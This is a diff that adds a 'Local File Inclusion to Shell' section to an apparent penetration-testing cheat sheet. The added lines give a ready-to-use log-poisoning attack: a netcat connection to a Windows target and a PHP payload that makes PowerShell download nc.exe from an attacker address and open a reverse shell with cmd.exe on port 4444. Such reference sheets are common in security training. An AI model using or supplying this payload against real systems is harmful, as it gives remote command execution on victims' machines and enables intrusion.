@@ -123,6 +123,12 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 gcc -m32|-m64 -o output source.c
 ```
 
+#### Local File Inclusion to Shell
+```php
+# Log contamination for Windows
+nc $WINDOWSTARGET 80
+<?php system('powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile(\'http://10.11.0.245/netcat/nc.exe\',\'nc.exe\'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }'); ?>
+```
 
 
 ## Local Enumeration & Privilege Escalation
